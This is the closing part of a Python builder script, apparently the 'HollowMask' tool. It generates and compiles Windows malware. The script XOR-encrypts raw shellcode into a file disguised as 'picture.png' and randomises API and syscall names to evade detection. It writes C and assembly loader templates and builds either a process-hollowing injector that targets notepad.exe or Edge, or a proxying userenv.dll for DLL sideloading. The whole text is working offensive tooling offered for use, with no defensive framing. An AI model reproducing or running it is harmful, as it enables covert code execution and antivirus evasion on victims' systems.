        c1 = (unsigned char)*s1++;
        c2 = (unsigned char)*s2++;
        if (c1 == '\0') {
            return c1 - c2;
        }
    } while (c1 == c2);
    return c1 - c2;
}

UINT64 GetSymbolAddress(HANDLE hModule, LPCSTR lpProcName) {
    UINT64 dllAddress = (UINT64)hModule,
        symbolAddress = 0,
        exportedAddressTable = 0,
        namePointerTable = 0,
        ordinalTable = 0;

    if (hModule == NULL) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = NULL;
    PIMAGE_DATA_DIRECTORY dataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY exportDirectory = NULL;

    ntHeaders = (PIMAGE_NT_HEADERS)(dllAddress + ((PIMAGE_DOS_HEADER)dllAddress)->e_lfanew);
    dataDirectory = (PIMAGE_DATA_DIRECTORY)&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllAddress + dataDirectory->VirtualAddress);

    exportedAddressTable = (dllAddress + exportDirectory->AddressOfFunctions);
    namePointerTable = (dllAddress + exportDirectory->AddressOfNames);
    ordinalTable = (dllAddress + exportDirectory->AddressOfNameOrdinals);

    if (((UINT64)lpProcName & 0xFFFF0000) == 0x00000000) {
        exportedAddressTable += ((IMAGE_ORDINAL((UINT64)lpProcName) - exportDirectory->Base) * sizeof(DWORD));
        symbolAddress = (UINT64)(dllAddress + DEREF_32(exportedAddressTable));
    }
    else {
        DWORD dwCounter = exportDirectory->NumberOfNames;
        while (dwCounter--) {
            char* cpExportedFunctionName = (char*)(dllAddress + DEREF_32(namePointerTable));
            if (my_strcmp(cpExportedFunctionName, lpProcName) == 0) {
                exportedAddressTable += (DEREF_16(ordinalTable) * sizeof(DWORD));
                symbolAddress = (UINT64)(dllAddress + DEREF_32(exportedAddressTable));
                break;
            }
            namePointerTable += sizeof(DWORD);
            ordinalTable += sizeof(WORD);
        }
    }

    return symbolAddress;
}
"""

adjuststack = """extern exec
global alignstack

segment .text

alignstack:
    push rdi                    ; backup rdi since we will be using this as our main register
    mov rdi, rsp                ; save stack pointer to rdi
    and rsp, byte -0x10         ; align stack with 16 bytes
    sub rsp, byte +0x20         ; allocate some space for our C function
    call exec                   ; call the C function
    mov rsp, rdi                ; restore stack pointer
    pop rdi                     ; restore rdi
    ret                         ; return where we left
"""

proxy_def = r"""EXPORTS
    AreThereVisibleLogoffScripts="c:\\windows\\system32\\userenv.AreThereVisibleLogoffScripts" @106
    AreThereVisibleShutdownScripts="c:\\windows\\system32\\userenv.AreThereVisibleShutdownScripts" @107
    CreateAppContainerProfile="c:\\windows\\system32\\userenv.CreateAppContainerProfile" @108
    CreateEnvironmentBlock="c:\\windows\\system32\\userenv.CreateEnvironmentBlock" @109
    CreateProfile="c:\\windows\\system32\\userenv.CreateProfile" @110
    DeleteAppContainerProfile="c:\\windows\\system32\\userenv.DeleteAppContainerProfile" @111
    DeleteProfileA="c:\\windows\\system32\\userenv.DeleteProfileA" @112
    DeleteProfileW="c:\\windows\\system32\\userenv.DeleteProfileW" @113
    DeriveAppContainerSidFromAppContainerName="c:\\windows\\system32\\userenv.DeriveAppContainerSidFromAppContainerName" @114
    DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName="c:\\windows\\system32\\userenv.DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName" @115
    DestroyEnvironmentBlock="c:\\windows\\system32\\userenv.DestroyEnvironmentBlock" @116
    DllCanUnloadNow="c:\\windows\\system32\\userenv.DllCanUnloadNow" @117
    DllGetClassObject="c:\\windows\\system32\\userenv.DllGetClassObject" @118
    DllRegisterServer="c:\\windows\\system32\\userenv.DllRegisterServer" @119
    DllUnregisterServer="c:\\windows\\system32\\userenv.DllUnregisterServer" @120
    EnterCriticalPolicySection="c:\\windows\\system32\\userenv.EnterCriticalPolicySection" @121
    ExpandEnvironmentStringsForUserA="c:\\windows\\system32\\userenv.ExpandEnvironmentStringsForUserA" @123
    ExpandEnvironmentStringsForUserW="c:\\windows\\system32\\userenv.ExpandEnvironmentStringsForUserW" @124
    ForceSyncFgPolicy="c:\\windows\\system32\\userenv.ForceSyncFgPolicy" @125
    FreeGPOListA="c:\\windows\\system32\\userenv.FreeGPOListA" @126
    FreeGPOListW="c:\\windows\\system32\\userenv.FreeGPOListW" @127
    GenerateGPNotification="c:\\windows\\system32\\userenv.GenerateGPNotification" @128
    GetAllUsersProfileDirectoryA="c:\\windows\\system32\\userenv.GetAllUsersProfileDirectoryA" @129
    GetAllUsersProfileDirectoryW="c:\\windows\\system32\\userenv.GetAllUsersProfileDirectoryW" @130
    GetAppContainerFolderPath="c:\\windows\\system32\\userenv.GetAppContainerFolderPath" @131
    GetAppContainerRegistryLocation="c:\\windows\\system32\\userenv.GetAppContainerRegistryLocation" @132
    GetAppliedGPOListA="c:\\windows\\system32\\userenv.GetAppliedGPOListA" @133
    GetAppliedGPOListW="c:\\windows\\system32\\userenv.GetAppliedGPOListW" @134
    GetDefaultUserProfileDirectoryA="c:\\windows\\system32\\userenv.GetDefaultUserProfileDirectoryA" @136
    GetDefaultUserProfileDirectoryW="c:\\windows\\system32\\userenv.GetDefaultUserProfileDirectoryW" @138
    GetGPOListA="c:\\windows\\system32\\userenv.GetGPOListA" @140
    GetGPOListW="c:\\windows\\system32\\userenv.GetGPOListW" @141
    GetNextFgPolicyRefreshInfo="c:\\windows\\system32\\userenv.GetNextFgPolicyRefreshInfo" @142
    GetPreviousFgPolicyRefreshInfo="c:\\windows\\system32\\userenv.GetPreviousFgPolicyRefreshInfo" @143
    GetProfileType="c:\\windows\\system32\\userenv.GetProfileType" @144
    GetProfilesDirectoryA="c:\\windows\\system32\\userenv.GetProfilesDirectoryA" @145
    GetProfilesDirectoryW="c:\\windows\\system32\\userenv.GetProfilesDirectoryW" @146
    GetUserProfileDirectoryA="c:\\windows\\system32\\userenv.GetUserProfileDirectoryA" @147
    GetUserProfileDirectoryW="c:\\windows\\system32\\userenv.GetUserProfileDirectoryW" @148
    HasPolicyForegroundProcessingCompleted="c:\\windows\\system32\\userenv.HasPolicyForegroundProcessingCompleted" @149
    LeaveCriticalPolicySection="c:\\windows\\system32\\userenv.LeaveCriticalPolicySection" @150
    LoadProfileExtender="c:\\windows\\system32\\userenv.LoadProfileExtender" @151
    LoadUserProfileA="c:\\windows\\system32\\userenv.LoadUserProfileA" @152
    LoadUserProfileW="c:\\windows\\system32\\userenv.LoadUserProfileW" @153
    ProcessGroupPolicyCompleted="c:\\windows\\system32\\userenv.ProcessGroupPolicyCompleted" @154
    ProcessGroupPolicyCompletedEx="c:\\windows\\system32\\userenv.ProcessGroupPolicyCompletedEx" @155
    RefreshPolicy="c:\\windows\\system32\\userenv.RefreshPolicy" @156
    RefreshPolicyEx="c:\\windows\\system32\\userenv.RefreshPolicyEx" @157
    RegisterGPNotification="c:\\windows\\system32\\userenv.RegisterGPNotification" @158
    RsopAccessCheckByType="c:\\windows\\system32\\userenv.RsopAccessCheckByType" @159
    RsopFileAccessCheck="c:\\windows\\system32\\userenv.RsopFileAccessCheck" @160
    RsopLoggingEnabled="c:\\windows\\system32\\userenv.RsopLoggingEnabled" @105
    RsopResetPolicySettingStatus="c:\\windows\\system32\\userenv.RsopResetPolicySettingStatus" @161
    RsopSetPolicySettingStatus="c:\\windows\\system32\\userenv.RsopSetPolicySettingStatus" @162
    UnloadProfileExtender="c:\\windows\\system32\\userenv.UnloadProfileExtender" @163
    UnloadUserProfile="c:\\windows\\system32\\userenv.UnloadUserProfile" @164
    UnregisterGPNotification="c:\\windows\\system32\\userenv.UnregisterGPNotification" @165
    WaitForMachinePolicyForegroundProcessing="c:\\windows\\system32\\userenv.WaitForMachinePolicyForegroundProcessing" @166
    WaitForUserPolicyForegroundProcessing="c:\\windows\\system32\\userenv.WaitForUserPolicyForegroundProcessing" @167
"""

def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        try:
            output_str += chr(current ^ ord(current_key))
        except:
            output_str += chr(ord(current) ^ ord(current_key))
    
    return output_str


def encryptShellcode(raw_shellcode, output_filename, KEY) -> bool:
    plaintext = open(raw_shellcode, "rb").read()
    ciphertext = xor(plaintext, KEY)
    hex_cipher = '\\x' + '\\x'.join(hex(ord(x))[2:].zfill(2) for x in ciphertext) + ''

    python_file = """a=b"replace_me";h=open("name_replace", "wb");h.write(a);h.close()""".replace(r"replace_me", hex_cipher).replace(r"name_replace", output_filename) # For real I couln't make the xor encryption work in any other way....

    exec(python_file)
    if output_filename in os.listdir():
        return True
    return False

def main():
    global template
    global template_dll
    global function_h
    global addressHunter
    
    logo = """  _   _       _ _               __  __           _    
    | | | | ___ | | | _____      _|  \/  | __ _ ___| | __
    | |_| |/ _ \| | |/ _ \ \ /\ / / |\/| |/ _` / __| |/ /
    |  _  | (_) | | | (_) \ V  V /| |  | | (_| \__ \   < 
    |_| |_|\___/|_|_|\___/ \_/\_/ |_|  |_|\__,_|___/_|\_\\
                                                        Made By MaorSabag!
                                                        """

    print(logo)
    
    parser = argparse.ArgumentParser(description="Process Hollowing injection")
    parser.add_argument("-f", "--file", dest="file", help="File containing raw shellcode")
    parser.add_argument("-p", "--process", dest="process", help="Process to inject into (\"Default c:\\\\windows\\\\system32\\\\notepad.exe\")", default="c:\\\\windows\\\\system32\\\\notepad.exe")
    parser.add_argument("-o", "--output", dest="out", help="Output file name (\"Default picture.png\")", default="picture.png")
    parser.add_argument("-dll", "--shared", dest="isDLL", help="Ouput file will served as dll sideloading", action="store_true",default=False)
    
    
    args = parser.parse_args()
    if not args.file:
        parser.print_help()
        exit(1)    
    
    random_xor_key = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(50))
    print("[+] Generated random xor key to encrypt the shellcode! ", random_xor_key)

    if not encryptShellcode(args.file, args.out, random_xor_key):
        print("[-] Something went wrong with encrypting the shellcode")
        exit(1)
    print("[+] Encrypted shellcode")


    if args.process == "msedge.exe":
        args.process = "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"
    elif args.process == "iexplore.exe":
        args.process = "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe"
    else:
        args.process = f"c:\\\\windows\\\\system32\\\\{args.process}"
        
    

    
    print("[+] Generating random names for syscalls!")
    syscalls = [
        "LoadLibraryA",
        "CreateProcessA",
        "TerminateProcess",
        "CloseHandle",
        "CreateFileA",
        "GetFileSize",
        "ReadFile",
        "GetThreadContext",
        "SetThreadContext",
        "ResumeThread",
        "Sleep",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemroy",
        "NtReadVirtualMemory",
        "NtReadVirtualMemeory",
        "wprintf"
    ]

    try:
        new_syscalls = []
        for _ in syscalls:
            random_name_syscall = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
            if random_name_syscall not in new_syscalls:
                new_syscalls.append(random_name_syscall)

        get_symbol_address = ''.join(random.choice(string.ascii_lowercase) for _ in range(15))
        CopyMemoryEx = ''.join(random.choice(string.ascii_lowercase) for _ in range(14))
        GetKernel32 = ''.join(random.choice(string.ascii_lowercase) for _ in range(16))

        if not args.isDLL:
            for i in range(len(new_syscalls)):
                print(f"\t[!] syscall {syscalls[i]} = {new_syscalls[i]}")
                template = template.replace(syscalls[i], new_syscalls[i])
                function_h = function_h.replace(syscalls[i], new_syscalls[i])

            template = template.replace("GetSymbolAddress", get_symbol_address)
            addressHunter = addressHunter.replace("GetSymbolAddress", get_symbol_address)

            template = template.replace("GetKernel32", GetKernel32)
            addressHunter = addressHunter.replace("GetKernel32", GetKernel32)

            template = template.replace("CopyMemoryEx", CopyMemoryEx)
            template = template.replace("XOR_KEY_PLACEHOLDER", random_xor_key)
            template = template.replace("OUTPUT_PLACEHOLDER", args.out)
            template = template.replace("PROCESS_INJECT_PLACEHOLDER", args.process)
        else:
            for i in range(len(new_syscalls)):
                print(f"\t[!] syscall {syscalls[i]} = {new_syscalls[i]}")
                template_dll = template_dll.replace(syscalls[i], new_syscalls[i])
                function_h = function_h.replace(syscalls[i], new_syscalls[i])

            template_dll = template_dll.replace("GetSymbolAddress", get_symbol_address)
            addressHunter = addressHunter.replace("GetSymbolAddress", get_symbol_address)

            template_dll = template_dll.replace("GetKernel32", GetKernel32)
            addressHunter = addressHunter.replace("GetKernel32", GetKernel32)

            template_dll = template_dll.replace("CopyMemoryEx", CopyMemoryEx)
            template_dll = template_dll.replace("XOR_KEY_PLACEHOLDER", random_xor_key)
            template_dll = template_dll.replace("OUTPUT_PLACEHOLDER", args.out)
            template_dll = template_dll.replace("PROCESS_INJECT_PLACEHOLDER", args.process)

        
        if "obfuscated" not in os.listdir():
            os.makedirs("obfuscated")
        else:
            os.system("rm -rf obfuscated/*")

        if not args.isDLL:
            with open("./obfuscated/main.cpp", "w") as h:
                h.write(template)
            
            with open("./obfuscated/adjuststack.asm", "w") as h:
                h.write(adjuststack)
        
        else:
            with open("./obfuscated/dllmain.cpp", "w") as h:
                h.write(template_dll)
            with open("./obfuscated/proxy.def", "w") as h:
                h.write(proxy_def)


        with open("./obfuscated/functions.h", "w") as h:
            h.write(function_h)

        with open("./obfuscated/addresshunter.h", "w") as h:
            h.write(addressHunter)
        
        

        os.chdir("./obfuscated")
        if not args.isDLL:
            os.system("nasm -f win64 adjuststack.asm -o adjuststack.o > /dev/null 2>&1")
            os.system("x86_64-w64-mingw32-gcc main.cpp -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o template.o -Wl,-Tlinker.ld,--no-seh > /dev/null 2>&1")
            os.system("x86_64-w64-mingw32-ld -s adjuststack.o template.o -o HollowMask.exe > /dev/null 2>&1")
            os.system("rm *.o")
        else:

            os.system("x86_64-w64-mingw32-gcc -m64 -c -Os dllmain.cpp -Wall -shared -masm=intel -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -Wl,--no-seh > /dev/null 2>&1")
            os.system("x86_64-w64-mingw32-dllwrap -m64 --def proxy.def dllmain.o -o userenv.dll > /dev/null 2>&1")
            os.system("rm *.o")

    
    except Exception as e:
        print("[-] An error occur while trying to compile! ", e)
        
    if "HollowMask.exe" in os.listdir() and not args.isDLL:
        print("Finished compiling HolowMask.exe!")
        os.system("mv HollowMask.exe ../")
    elif "userenv.dll" in os.listdir() and args.isDLL:
        print("Finished compiling userenv.dll!")
        os.system("mv userenv.dll ../")
    else:
        print("[-] Something went wrong.. check you have all of the dependencies..")
    


if __name__ == "__main__":
    main()